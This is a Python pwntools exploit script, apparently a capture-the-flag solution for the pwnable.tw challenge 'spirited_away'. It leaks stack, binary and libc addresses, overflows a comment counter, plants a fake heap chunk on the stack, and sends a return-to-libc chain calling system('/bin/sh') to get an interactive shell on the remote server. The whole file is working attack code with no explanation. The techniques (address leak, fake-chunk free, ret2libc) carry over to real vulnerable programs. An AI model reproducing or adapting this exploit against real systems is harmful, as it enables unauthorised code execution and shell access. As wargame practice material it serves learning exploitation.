from pwn import *

#s=process('./spirited_away',env={'LD_PRELOAD':'./libc.so.6'})
s=remote('chall.pwnable.tw', 10204)

e=ELF('./spirited_away')
#l=ELF('/lib/i386-linux-gnu/libc.so.6')
l=ELF('./libc.so.6')
context.log_level='debug'

stack_leak=''
binary_leak=''
libc_leak=''
libc_base=''
ret_addr=''
fackchunk=''

def exploit_leak(name, age, why_movie, comment, until, ans):

    print s.recvuntil('Please enter your name:')
    s.send(name)
    print s.recvuntil('Please enter your age:')
    s.sendline(str(age))
    print s.recvuntil('Why did you came to see this movie?')
    s.send(why_movie) #leak addr
    print s.recvuntil('Please enter your comment:')
    raw_input('leak')
    s.send(comment)
   
    leak()
    print s.recvuntil('Would you like to leave another comment?')
    s.send('y')

def leak():
    global stack_leak
    global binary_leak
    global libc_leak
    global ret_addr
    global libc_base
    global fakechunk

    print s.recvuntil('B'*0x50)
    stack_leak=u32(s.recv(4))
    binary_leak=u32(s.recv(4))
    libc_leak=u32(s.recv(4))
    libc_base=libc_leak-0x1d6d60+0x20000+0x4000+0x2000
    ret_addr=stack_leak-0x1c
    fakechunk=stack_leak-0x70

def info(name, age, why_movie, comment, ans, count):
    print "count: "+str(count)    

    if count < 9 or count >=99:     
    	s.recvuntil('Please enter your name:')
    	s.send(name)
    	s.recvuntil('Please enter your age:')
    	s.sendline(str(age))
    	s.recvuntil('Why did you came to see this movie?')
    	s.send(why_movie) #leak addr
    	s.recvuntil('Please enter your comment:')
    	s.send(comment)
    	s.recvuntil('Would you like to leave another comment? <y/n>:')
    	s.send(ans+'\n')
    else:
	s.recvuntil('name:')
	s.recvuntil('Please enter your age:')
	s.sendline(str(age))
	s.recvuntil('Why did you came to see this movie?')
	s.send(why_movie) #leak addr
	s.recvuntil('comment:')
	s.recvuntil('Would you like to leave another comment? <y/n>:')
	s.sendline('y')

def info_i(name, age, why_movie, comment, ans):

    print s.recvuntil('Please enter your name:')
    raw_input('name')
    s.send(name)
    raw_input()
    print s.recvuntil('Please enter your age:')
    raw_input('age')
    s.sendline(str(age))
    raw_input()
    print s.recvuntil('Why did you came to see this movie?')
    raw_input('movie')
    s.send(why_movie) #leak addr
    print s.recvuntil('Please enter your comment:')
    raw_input('comment')
    s.send(comment)
    s.recvuntil('Would you like to leave another comment? <y/n>:')
    s.send(ans+'\n')


if __name__ == '__main__':

    exploit_leak('A'*4,111111,'B'*0x50,'C'*0x3c, 1024, 'y')

    print s.recv(1024)

    for i in range(0,101):
            info('A',1,'B','C','y',i) 
          
    raw_input('gogo')

    fake_chunk=''
    fake_chunk+=p32(0x0)
    fake_chunk+=p32(0x41)
    fake_chunk+='a'*60
    fake_chunk+=p32(0x41)

    print "\n[*]************************************************************[*]"
    print 'stack_leak: '+str(hex(stack_leak))
    print 'binary_leak: '+str(hex(binary_leak))
    print 'libc_leak: '+str(hex(libc_leak))
    print 'libc_base: '+str(hex(libc_base))
    print 'ret_addr: '+str(hex(ret_addr))
    print "[*]************************************************************[*]\n"


    rop=''
    rop+='A'*0x4c
    rop+=p32(libc_base+l.symbols['system'])
    rop+='AAAA'
    rop+=p32(libc_base+list(l.search('/bin/sh\x00'))[0])
    raw_input('exploit')
    
    info_i('D'*4,1234,fake_chunk,'p'*84+p32(stack_leak-104),'y')
    raw_input('Rop ready')

    info_i(rop,1234,'0','A'*84 + p32(0),'n')
    raw_input('a')
    
    s.interactive()


